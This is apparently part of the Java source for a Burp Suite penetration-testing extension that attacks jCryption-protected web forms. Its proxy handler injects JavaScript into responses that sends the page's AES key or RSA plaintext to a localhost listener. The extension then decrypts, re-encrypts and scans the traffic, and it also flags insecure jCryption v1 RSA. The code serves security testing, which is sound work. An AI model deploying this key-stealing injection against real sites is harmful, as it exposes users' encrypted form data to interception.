								callbacks.saveExtensionSetting("JCryption_lastPassphrase", pStr);
								txt_passphrase_value.setText(pStr);
								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
							}
							else
							{
								try
								{
									IParameter s = helpers.getRequestParameter(messageInfo.getRequest(), "s");
									if (s != null && s.getValue().length() > 0)
									{
										String plaintext = URLDecoder.decode(p.getValue(), "UTF-8");
										String ciphertext = JCryption.encrypt_v1(plaintext, JCryption.getRSAPubKey(mainKeypair.get("e"), mainKeypair.get("n")), Integer.parseInt(s.getValue()));

										// add ciphertext and s+plaintext to RSAData
										RSAData.put(ciphertext,s.getValue() + "," + plaintext);
									}
								}
								catch (UnsupportedEncodingException e) {
									e.printStackTrace();
								}
								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
							}
						}
					}

					if (jCryption_version == 1) // parse jCryption v1 "generateKeypair" request
					{
						IRequestInfo requestInfo = helpers.analyzeRequest(messageInfo);

						URL url = requestInfo.getUrl();
						String urlStr = url.getFile();
						if (urlStr.contains("?generateKeypair="))
						{
							int ref = message.getMessageReference();
							generateKeypairRefs.add(ref);
							message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
						}
					}
				}
			}
			else // processing HTTP Responses
			{
				int ref = message.getMessageReference();
				if (refs.containsKey(ref))
				{
					Date responseDate = new Date();
					synchronized(log)
					{
						int row = refs.get(ref);
						LogEntry r = log.get(row);
						if (r != null)
						{
							IHttpRequestResponsePersisted irequestResponse = callbacks.saveBuffersToTempFiles(messageInfo);
							r.response = irequestResponse.getResponse();
							long tdiff = responseDate.getTime() - r.requestDate.getTime();
							r.timeDiff = TimeUnit.MILLISECONDS.convert(tdiff, TimeUnit.MILLISECONDS);
							log.set(row, r);
							fireTableRowsUpdated(row, row);
						}
						refs.remove(ref);
					}
				}
				else
				{
					IResponseInfo x = helpers.analyzeResponse(messageInfo.getResponse());

					if (generateKeypairRefs.contains(ref))
					{
						String response = new String(messageInfo.getResponse());
						String match_v1 = new String("\"([^{}\":,]+)?\":\"([^{}\":,]+)?\"");
						Pattern pattern_v1 = Pattern.compile(match_v1);
						Matcher matcher_v1 = pattern_v1.matcher(response);

						while (matcher_v1.find())
						{
							if (matcher_v1.groupCount() == 2)
							{
								String k = matcher_v1.group(1);
								String v = matcher_v1.group(2);
								if (mainKeypair.containsKey(k)) mainKeypair.remove(k);
								mainKeypair.put(k, v);
							}
						}
						generateKeypairRefs.remove(new Integer(ref));
						message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
					}
					else
					{
						List<String> hdr = x.getHeaders();
						int check = 0;
						for (String s : hdr) {
							if (s.contains("javascript") && s.contains("Content-Type"))
							{
								check = 1;
								break;
							}
						}

						if (check == 1)
						{
							boolean isHTTPS = messageInfo.getHttpService().getProtocol().equalsIgnoreCase("https");

							String match_v3 = new String("success.call(this, AESEncryptionKey);");
							String replace_v3 = new String("setTimeout(function(){ success.call(this, AESEncryptionKey); }, 888); var x = new XMLHttpRequest(); x.open(\"GET\", \"" + (isHTTPS ? "https" : "http") + "://localhost:1337/?p=\"+AESEncryptionKey, true); x.send();");
							String response = new String(messageInfo.getResponse());

							if (response.contains(match_v3) && !response.contains(replace_v3))
							{
								String r = response.replaceFirst(Pattern.quote(match_v3), replace_v3);
								int bodyOffset = x.getBodyOffset();
								byte[] res = r.substring(bodyOffset).getBytes();
								message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
								message.getMessageInfo().setComment("Hijacked by " + EXTENSION_NAME);

								jCryption_version = 3;
								js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);

								// jCryption v2 using AES-CTR-256 encryption algorithm, check it ;)
								String match_v2 = new String("Aes.Ctr.encrypt(");
								Pattern pattern_v2 = Pattern.compile(Pattern.quote(match_v2));
								Matcher matcher_v2 = pattern_v2.matcher(response);
								if (matcher_v2.find())
								{
									jCryption_version = 2;
									js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
								}

								message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
							}
							else
							{
								// jCryption v1 using plain RSA encryption algorithm, check it ;)
								String match_v1 = new String("$.jCryption.encrypt = function(string,keyPair,callback) {");
								String replace_v1 = new String("\\$.jCryption.encrypt = function(string,keyPair,callback) { var x = new XMLHttpRequest(); x.open(\"GET\", \"" + (isHTTPS ? "https" : "http") + "://localhost:1337/?p=\"+encodeURIComponent(string)+\"&s=\"+keyPair.chunkSize, true); x.send();");
								if (response.contains(match_v1) && !response.contains(replace_v1))
								{
									String r = response.replaceFirst(Pattern.quote(match_v1), replace_v1);
									int bodyOffset = x.getBodyOffset();
									byte[] res = r.substring(bodyOffset).getBytes();
									message.getMessageInfo().setResponse(helpers.buildHttpMessage(hdr, res));
									message.getMessageInfo().setComment("Hijacked by " + EXTENSION_NAME);
									jCryption_version = 1;
									js_version_combo.setSelectedIndex(js_versions.length - jCryption_version);
									mainPassphrase = "".getBytes();
									txt_passphrase_value.setText(helpers.bytesToString(mainPassphrase));
									message.setInterceptAction(IInterceptedProxyMessage.ACTION_DONT_INTERCEPT);
								}
							}
						}
					}
				}
			}
		}
	}

	// IScannerCheck

	private List<IScanIssue> doPassivejCryptionInsecureRSAEncryption(IHttpRequestResponse baseRequestResponse)
	{
		List<IScanIssue> scanIssueList = new ArrayList<IScanIssue>();

		byte[] response = baseRequestResponse.getResponse();
		IResponseInfo x = helpers.analyzeResponse(response);
		int check = 0;

		// search javascript
		List<String> hdr = x.getHeaders();
		for (String s : hdr) {
			if (s.contains("javascript") && s.contains("Content-Type"))
			{
				check = 1;
				break;
			}
		}

		// search keypair
		if (check == 0 && jCryption_version == 1)
		{
			String r = new String(response);
			String match_v1 = new String("\"([^{}\":,]+)?\":\"([^{}\":,]+)?\"");
			Pattern pattern_v1 = Pattern.compile(match_v1);
			Matcher matcher_v1 = pattern_v1.matcher(r);
			Map<String,String> keypair = new HashMap<>();

			while (matcher_v1.find())
			{
				if (matcher_v1.groupCount() == 2)
				{
					String k = matcher_v1.group(1);
					String v = matcher_v1.group(2);
					keypair.put(k, v);
				}
			}

			// found keypair
			if (keypair.size() == 3)
			{
				String keyStr = JCryption.getRSAPubKey(keypair.get("e"), keypair.get("n")).toString();

				// found jCryption v1.x
				IScanIssue i = new JCryption_InsecureRSAEncryption(new IHttpRequestResponse[] { baseRequestResponse }, baseRequestResponse.getHttpService(), helpers.analyzeRequest(baseRequestResponse).getUrl(), keyStr);
				if (i != null) scanIssueList.add(i);
			}
		}
		else
		{
			// extract body from response
			int bodyOffset = x.getBodyOffset();
			String r = helpers.bytesToString(response);

			byte[] res = r.substring(bodyOffset).getBytes();

			// first check if md5 match with original js md5
			final String jCryptionv12Digest = "c12d66378f79ef99bbba40bd17f89061";
			final String jCryptionv11Digest = "62fc6d6dc4864139e3e390fa1fa497e9";
			final String jCryptionv10Digest = "9eaabd71bfeda2707488e6937377b8c2";

			byte[] jsDigest = JCryption.getMD5(res);
			String strDigest = JCryption.byteArrayToHex(jsDigest);

			if (strDigest.equals(jCryptionv10Digest) ||
				strDigest.equals(jCryptionv11Digest) ||
				strDigest.equals(jCryptionv12Digest))
			{
				// found jCryption v1.x by md5 hash matching
				IScanIssue i = new JCryption_InsecureRSAEncryption(new IHttpRequestResponse[] { baseRequestResponse }, baseRequestResponse.getHttpService(), helpers.analyzeRequest(baseRequestResponse).getUrl(), true);
				if (i != null) scanIssueList.add(i);
			}
			else
			{
				// proceed with content inspection
				String match_v1 = new String("$.jCryption.encrypt = function(string,keyPair,callback) {");
				if (r.contains(match_v1))
				{
					IScanIssue i = new JCryption_InsecureRSAEncryption(new IHttpRequestResponse[] { baseRequestResponse }, baseRequestResponse.getHttpService(), helpers.analyzeRequest(baseRequestResponse).getUrl(), false);
					if (i != null) scanIssueList.add(i);
				}
			}
		}

		return scanIssueList;
	}

	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		List<IScanIssue> scanIssueList = new ArrayList<IScanIssue>();
		scanIssueList.addAll(doPassivejCryptionInsecureRSAEncryption(baseRequestResponse));
		return scanIssueList;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
		return null;
	}

	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
		return (existingIssue.getIssueName().equals(newIssue.getIssueName()) ? -1 : 0);
	}

	// IScannerInsertionPointProvider

	@Override
	public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse) {

		if (isEnabled == false) return null;

		byte[] req = baseRequestResponse.getRequest();

		IParameter dataParameter = helpers.getRequestParameter(req, mainParameter);

		if (dataParameter == null) return null;

		String urlDecoded = helpers.urlDecode(dataParameter.getValue());

		if (isBase64(urlDecoded) && mainPassphrase != null && jCryption_version != 1)
		{
			// if the parameter is present, add custom insertion points for it
			List<IScannerInsertionPoint> insertionPoints = new ArrayList<IScannerInsertionPoint>();

			byte[] decrypted = JCryption.decrypt(mainPassphrase, helpers.base64Decode(urlDecoded), jCryption_version);

			// rebuild decrypted request
			String param = helpers.bytesToString(decrypted);

			IParameter d = helpers.buildParameter(mainParameter, param, dataParameter.getType());
			byte[] req2 = helpers.updateParameter(req, d);
			String req3 = helpers.bytesToString(req2).replaceAll(mainParameter+"=", "");

			// retrieve request parameters
			IRequestInfo requestInfo = helpers.analyzeRequest(helpers.stringToBytes(req3));
			List<IParameter> requestParams = requestInfo.getParameters();

			for (IParameter parameter : requestParams)
			{
				if (parameter.getType() != IParameter.PARAM_BODY && parameter.getType() != IParameter.PARAM_URL) continue;

				insertionPoints.add(new InsertionPoint(req, param, parameter, null));
			}

			return insertionPoints;
		}
		else if (jCryption_version == 1 && mainKeypair.size() == 3)
		{
			// if the parameter is present, add custom insertion points for it
			List<IScannerInsertionPoint> insertionPoints = new ArrayList<IScannerInsertionPoint>();

			// get plaintext from Logger
			byte[] ciphertext = helpers.stringToBytes(dataParameter.getValue());

			String dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));

			int currentJSVersion = getCurrentJCryptionJSVersion(dataHash);

			if (currentJSVersion != jCryption_version) return null;

			// rebuild decrypted request
			String param = getPlaintextFromLogger(dataHash);

			IParameter d = helpers.buildParameter(mainParameter, param, dataParameter.getType());
			byte[] req2 = helpers.updateParameter(req, d);
			String req3 = helpers.bytesToString(req2).replaceAll(mainParameter+"=", "");

			// retrieve request parameters
			IRequestInfo requestInfo = helpers.analyzeRequest(helpers.stringToBytes(req3));
			List<IParameter> requestParams = requestInfo.getParameters();

			for (IParameter parameter : requestParams)
			{
				if (parameter.getType() != IParameter.PARAM_BODY && parameter.getType() != IParameter.PARAM_URL) continue;
				insertionPoints.add(new InsertionPoint(req, param, parameter, dataHash));
			}

			return insertionPoints;
		}

		return null;
	}

	// IScannerInsertionPoint

	class InsertionPoint implements IScannerInsertionPoint
	{
		private byte[] baseRequest;
		private String insertionPointPrefix;
		private String baseValue;
		private String insertionPointSuffix;
		private byte currentParamType;
		private String dataHash;

		InsertionPoint(byte[] baseRequest, String dataParameter, IParameter parameter, String idataHash)
		{
			this.baseRequest = baseRequest;
			this.currentParamType = parameter.getType();

			if (idataHash != null) this.dataHash = idataHash;

			int start = dataParameter.indexOf(parameter.getName()) + parameter.getName().length() + 1;
			insertionPointPrefix = dataParameter.substring(0, start);
			int end = dataParameter.indexOf("&", start);

			if (end == -1 && parameter.getType() == IParameter.PARAM_URL)
				end = dataParameter.indexOf(" ", start);

			if (end == -1)
				end = dataParameter.length();

			baseValue = dataParameter.substring(start, end);
			insertionPointSuffix = dataParameter.substring(end, dataParameter.length());
		}

		@Override
		public String getInsertionPointName()
		{
			return EXTENSION_NAME;
		}

		@Override
		public String getBaseValue()
		{
			return baseValue;
		}

		@Override
		public byte[] buildRequest(byte[] payload)
		{
			try
			{
				String input = insertionPointPrefix + helpers.bytesToString(payload) + insertionPointSuffix;

				if (dataHash != null)
				{
					// get currentS
					String tmpS = getSFromLogger(dataHash);

					if (tmpS != null && tmpS.length() > 0)
					{
						int currentS = Integer.parseInt(tmpS);
						String ciphertext = JCryption.encrypt_v1(helpers.bytesToString(input.getBytes("UTF-8")), JCryption.getRSAPubKey(mainKeypair.get("e"), mainKeypair.get("n")), currentS);
						return helpers.updateParameter(baseRequest, helpers.buildParameter(mainParameter, ciphertext, currentParamType));
					}
					return null;
				}
				else if (mainPassphrase != null)
				{
					byte[] encrypted = JCryption.encrypt(mainPassphrase, input.getBytes("UTF-8"), jCryption_version);
					input = helpers.urlEncode(helpers.base64Encode(encrypted));
					return helpers.updateParameter(baseRequest, helpers.buildParameter(mainParameter, input, currentParamType));
				}

				return null;
			}
			catch (Exception e)
			{
				throw new RuntimeException(e);
			}
		}

		@Override
		public int[] getPayloadOffsets(byte[] payload)
		{
			return null;
		}

		@Override
		public byte getInsertionPointType()
		{
			return INS_EXTENSION_PROVIDED;
		}
	}

	@Override
	public void extensionUnloaded()
	{
		// save current extension settings
		if (mainParameter != null && mainParameter.length() > 0) callbacks.saveExtensionSetting("JCryption_lastParameter", mainParameter);
		String tmp = helpers.bytesToString(mainPassphrase);
		if (tmp != null && tmp.length() > 0) callbacks.saveExtensionSetting("JCryption_lastPassphrase", tmp);
		callbacks.saveExtensionSetting("JCryption_lastVersion", Integer.toString(jCryption_version));
	}

	private class Table extends JTable
	{
		private static final long serialVersionUID = 1L;

		public Table(TableModel tableModel)
		{
			super(tableModel);
		}

		@Override
		public void changeSelection(int row, int col, boolean toggle, boolean extend)
		{
			// show the log entry for the selected row
			LogEntry logEntry = log.get(row);
			requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
			byte[] tmp = logEntry.response;
			if (tmp != null && tmp.length > 0) responseViewer.setMessage(tmp, false);
			currentlyDisplayedItem = logEntry.requestResponse;

			super.changeSelection(row, col, toggle, extend);
		}
	}

	// handle logger data

	private class LogEntry
	{
		final int version;
		final IHttpRequestResponsePersisted requestResponse;
		final IRequestInfo requestInfo;
		byte[] response;
		final Date requestDate;
		long timeDiff = 0;

		final String host;
		final String method;
		final URL url;
		final byte[] params;
		final String v1_params;
		final String v1_s;
		final String cookie;
		final String timeStr;
		final String comment;
		final String passphrase;
		String dataHash;

		public LogEntry(IHttpRequestResponsePersisted irequestResponse, IRequestInfo irequestInfo, byte[] ciphertext, String v1_params, String v1_s, String passphrase, Date irequestDate, int version)
		{
			this.version = version;
			this.requestResponse = irequestResponse;
			this.requestInfo = irequestInfo;

			this.host = requestResponse.getHttpService().getHost();
			this.method = requestInfo.getMethod();
			this.url = requestInfo.getUrl();

			if (version == 1) this.params = ciphertext;
			else              this.params = (passphrase.getBytes().length > 0) ? JCryption.decrypt(passphrase.getBytes(), ciphertext, jCryption_version) : "".getBytes();

			this.v1_params = v1_params;
			this.v1_s = v1_s;

			List<IParameter> requestParams = requestInfo.getParameters();

			String tmpCookie = "";
			for (IParameter parameter : requestParams)
			{
				if (parameter.getType() != IParameter.PARAM_COOKIE) continue;
				tmpCookie += parameter.getName() + "=" + parameter.getValue() + "; ";
			}

			this.cookie = tmpCookie;
			this.requestDate = (irequestDate == null) ? new Date() : irequestDate;
			this.timeStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(this.requestDate);
			this.comment = (requestResponse.getComment() != null) ? requestResponse.getComment() : "";
			this.passphrase = passphrase;

			if (version == 1) this.dataHash = JCryption.byteArrayToHex(JCryption.getMD5(helpers.stringToBytes(v1_params)));
			else              this.dataHash = JCryption.byteArrayToHex(JCryption.getMD5(ciphertext));
		}

		// convert entry to CSV

		public String toCSV()
		{
			StringBuilder sb = new StringBuilder();

			sb.append("\"" + this.host +
				  "\",\"" + this.method +
				  "\",\"" + this.url.toString() +
				  "\",\"" + new String(this.params) +
				  "\",\"" + this.passphrase +
				  "\",\"" + this.cookie +
				  "\",\"" + this.timeStr +
				  "\",\"" + this.timeDiff +
				  "\",\"" + this.comment +
				  "\",\"" + helpers.base64Encode(helpers.bytesToString(this.requestResponse.getRequest())) +
				  "\",\"" + helpers.base64Encode(helpers.bytesToString(this.response)) +
				  "\",\"" + this.version +
				  "\"");

			return sb.toString();
		}
	}

	// crypt utils

	private static class JCryption
	{
		public static String byteArrayToHex(byte[] a)
		{
			StringBuilder sb = new StringBuilder(a.length * 2);
			for(byte b: a) sb.append(String.format("%02x", b));
			return sb.toString();
		}

		public static byte[] getMD5(byte[] input)
		{
			try
			{
				MessageDigest md = MessageDigest.getInstance("MD5");
				byte[] digest = md.digest(input);
				return digest;
			}
			catch(NoSuchAlgorithmException e)
			{
				throw new RuntimeException(e);
			}
		}

		private static byte[] aes_cbc_crypt(int mode, byte[] key, byte[] iv, byte[] data)
		{
			try {
				Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
				SecretKeySpec aKey = new SecretKeySpec(key, "AES");
				IvParameterSpec aIV = new IvParameterSpec(iv);
				cipher.init((mode == 0) ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE, aKey, aIV);
				return cipher.doFinal(data);
			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
				throw new RuntimeException(e);
			}
		}

		private static SecretKey getKeyFromPassphrase(byte[] passphrase)
		{
			try {
				//byte[] password = passphrase.getBytes("UTF-8");
				byte[] password = passphrase;
				int nBytes = 32;
				byte[] pwBytes = new byte[nBytes];
				System.arraycopy(password, 0, pwBytes, 0, (password.length >= nBytes) ? nBytes : password.length);

				Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
				SecretKeySpec aesECBkey = new SecretKeySpec(pwBytes, "AES");
				cipher.init(Cipher.ENCRYPT_MODE, aesECBkey);
				byte[] ck = cipher.doFinal(pwBytes, 0, 16);

				byte[] k = new byte[nBytes];
				System.arraycopy(ck, 0, k, 0, 16);
				System.arraycopy(ck, 0, k, 16, nBytes - 16);

				SecretKey key = new SecretKeySpec(k, "AES");
				return key;
			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e) {
				throw new RuntimeException(e);
			}
		}

		public static PublicKey getRSAPubKey(String exp, String mod)
		{
			try {
				// set RSA Exponent and Modulus
				BigInteger exponent = new BigInteger(exp, 16);
				BigInteger modulus = new BigInteger(mod, 16);

				// gen RSA Public Key from Exponent and Modulus
				RSAPublicKeySpec spec = new RSAPublicKeySpec(modulus, exponent);
				KeyFactory kf = KeyFactory.getInstance("RSA");
				RSAPublicKey k = (RSAPublicKey) kf.generatePublic(spec);

				// get RSA Public Key Encoded
				PublicKey pk = kf.generatePublic(new X509EncodedKeySpec(k.getEncoded()));
				return pk;
			} catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
				throw new RuntimeException(e);
			}
		}

		public static String encrypt_v1(String plaintext, PublicKey publicKey, int chunkSize)
		{
			try
			{
				// computing plaintext checksum
				int charSum = 0;
				for (int i = 0; i < plaintext.length(); i++)
					charSum += Character.codePointAt(plaintext, i);

				// plaintext = (checksum || plaintext)
				String tag = "0123456789abcdef";
				char hex1 = tag.charAt((charSum & 0xF0) >> 4);
				char hex2 = tag.charAt(charSum & 0x0F);
				String hex = "" + hex1 + hex2;
				String taggedString = hex + plaintext;

				// padding with zeros to fill chunkSize
				byte[] tmp = taggedString.getBytes();

				int len = tmp.length;
				while ((len % chunkSize) != 0) len++;

				byte[] encrypt = new byte[len];
				System.arraycopy(tmp, 0, encrypt, 0, tmp.length);

				// initializing RSA/ECB/NoPadding cipher with Public Key
				Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
				cipher.init(Cipher.ENCRYPT_MODE, publicKey);

				// splitting the plaintext due to RSA/ECB restriction on plaintext maxlength
				int rounds = len / chunkSize;
				int bs = cipher.getOutputSize(chunkSize);
				byte[] ciphertext = new byte[(bs * rounds) + (rounds-1)];
				byte[] message = new byte[chunkSize];
				String cipherString = "";

				for (int x = 0; x < rounds; x++)
				{
					if (x > 0)
					{
						ciphertext[(x * bs) + (x-1)] = 0x2b; // add '+'
						cipherString += '+';
					}

					// get chunk and reverse it
					System.arraycopy(encrypt, (x * chunkSize), message, 0, chunkSize);
					for (int y = 0; y < message.length / 2; y++)
					{
						byte t = message[y];
						message[y] = message[message.length - y - 1];
						message[message.length - y - 1] = t;
					}

					// encrypt plaintext
					byte[] cipherBlock = cipher.doFinal(message, 0, message.length);

					// update ciphertext
					System.arraycopy(cipherBlock, 0, ciphertext, (x * bs) + x, bs);
					cipherString += byteArrayToHex(cipherBlock);
				}

				// ciphertext = block(01) || '+' || block(02) || '+' || ... || block(N-1) || '+' || block(N)
				// return Base64.getEncoder().encodeToString(cipherText);
				// return ciphertext;
				return cipherString;
			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e) {
				throw new RuntimeException(e);
			}
		}

		public static byte[] decrypt(byte[] password, byte[] ciphertext, int version)
		{
			switch (version)
			{
				case  2: return decrypt_v2(password, ciphertext);
				case  3: return decrypt_v3(password, ciphertext);
				default: return "".getBytes();
			}
		}

		public static byte[] encrypt(byte[] password, byte[] ciphertext, int version)
		{
			switch (version)
			{
				case  2: return encrypt_v2(password, ciphertext);
				case  3: return encrypt_v3(password, ciphertext);
				default: return "".getBytes();
			}
		}

		private static byte[] decrypt_v2(byte[] passphrase, byte[] ciphertext)
		{
			try {
				SecretKey key = getKeyFromPassphrase(passphrase);
				//	byte[] ct = Base64.getDecoder().decode(ciphertext);
				byte[] ct = ciphertext;
				byte[] counterBlock = new byte[16];
				System.arraycopy(ct, 0, counterBlock, 0, counterBlock.length / 2);
				Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
				IvParameterSpec iv = new IvParameterSpec(counterBlock);
				cipher.init(Cipher.DECRYPT_MODE, key, iv);

				byte[] plaintext = cipher.doFinal(ct, 8, ct.length - (counterBlock.length / 2));

				return plaintext;
				// return new String(plaintext);
			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
				throw new RuntimeException(e);
			}
		}

		private static byte[] encrypt_v2(byte[] passphrase, byte[] plaintext)
		{
			try {
				SecretKey key = getKeyFromPassphrase(passphrase);

				// byte[] pt = plaintext.getBytes("UTF-8");
				byte[] pt = plaintext;
				byte[] counterBlock = new byte[16];

				long nonce    = System.currentTimeMillis();
				long nonceMs  = nonce % 1000;
				long nonceSec = Math.round(Math.floor(nonce / 1000));
				long nonceRnd = Math.round(Math.floor(Math.random()*0xffff));

				int i;
				for (i=0; i<2; i++) counterBlock[i]   = (byte) ((nonceMs  >>> i*8) & 0xff);
				for (i=0; i<2; i++) counterBlock[i+2] = (byte) ((nonceRnd >>> i*8) & 0xff);
				for (i=0; i<4; i++) counterBlock[i+4] = (byte) ((nonceSec >>> i*8) & 0xff);

				Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
				IvParameterSpec iv = new IvParameterSpec(counterBlock);
				cipher.init(Cipher.ENCRYPT_MODE, key, iv);
				byte[] ct = cipher.doFinal(pt, 0, pt.length);

				byte[] ret = new byte[(counterBlock.length / 2)+ct.length];
				System.arraycopy(counterBlock, 0, ret, 0, counterBlock.length / 2);
				System.arraycopy(ct, 0, ret, counterBlock.length / 2, ct.length);

				return ret;
				// return Base64.getEncoder().encodeToString(ret);
			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException e) {
				throw new RuntimeException(e);
			}
		}

		private static byte[] decrypt_v3(byte[] password, byte[] ciphertext)
		{
			byte[] data = ciphertext; //Base64.getDecoder().decode(ciphertext);
			byte[] salt = Arrays.copyOfRange(data, 8, 16);
			byte[] ct   = Arrays.copyOfRange(data, 16, data.length);

			int rounds = 3;
			byte[] data00 = new byte[password.length + salt.length];
			System.arraycopy(password, 0, data00, 0, password.length);
			System.arraycopy(salt, 0, data00, password.length, salt.length);

			byte[] result = new byte[16 * rounds];
			byte[][] md5_hash = new byte[rounds][];

			md5_hash[0] = JCryption.getMD5(data00);

			System.arraycopy(md5_hash[0], 0, result, 0, md5_hash[0].length);

			byte[] tmp = new byte[md5_hash[0].length + data00.length];
			for (int i = 1; i < rounds; ++i)
			{
				System.arraycopy(md5_hash[i-1], 0, tmp, 0, md5_hash[i-1].length);
				System.arraycopy(data00, 0, tmp, md5_hash[i-1].length, data00.length);
				md5_hash[i] = JCryption.getMD5(tmp);
				System.arraycopy(md5_hash[i], 0, result, (md5_hash[i].length * i), md5_hash[i].length);
			}

			byte[] key = Arrays.copyOfRange(result, 0, 32);
			byte[] iv  = Arrays.copyOfRange(result, 32, 32+16);

			return JCryption.aes_cbc_crypt(1, key, iv, ct);
	   }

	   private static byte[] encrypt_v3(byte[] password, byte[] plaintext)
	   {
			byte[] salt = new byte[8];
			new Random(System.currentTimeMillis()).nextBytes(salt);

			int rounds = 3;
			byte[] dx = new byte[16];
			byte[] result = new byte[16 * rounds];
			byte[] tmp = new byte[password.length+salt.length];

			System.arraycopy(password, 0, tmp, 0, password.length);
			System.arraycopy(salt, 0, tmp, password.length, salt.length);
			dx = JCryption.getMD5(tmp);
			System.arraycopy(dx, 0, result, 0, dx.length);

			byte[] tmp2 = new byte[dx.length+password.length+salt.length];
			for (int i = 1; i < rounds; i++)
			{
				System.arraycopy(dx, 0, tmp2, 0, dx.length);
				System.arraycopy(password, 0, tmp2, dx.length, password.length);
				System.arraycopy(salt, 0, tmp2, dx.length + password.length, salt.length);
				dx = JCryption.getMD5(tmp2);
				System.arraycopy(dx, 0, result, (dx.length * i), dx.length);
			}

			byte[] key = Arrays.copyOfRange(result, 0, 32);
			byte[] iv  = Arrays.copyOfRange(result, 32, 32+16);
			byte[] pt  = plaintext;
			byte[] ct  = aes_cbc_crypt(0, key, iv, pt);

			byte[] ret = new byte[8+salt.length+ct.length];
			System.arraycopy("Salted__".getBytes(), 0, ret, 0, 8);
			System.arraycopy(salt, 0, ret, 8, salt.length);
			System.arraycopy(ct, 0, ret, 8+salt.length, ct.length);

			return ret;
//			return Base64.getEncoder().encodeToString(ret);
		}
	}
}
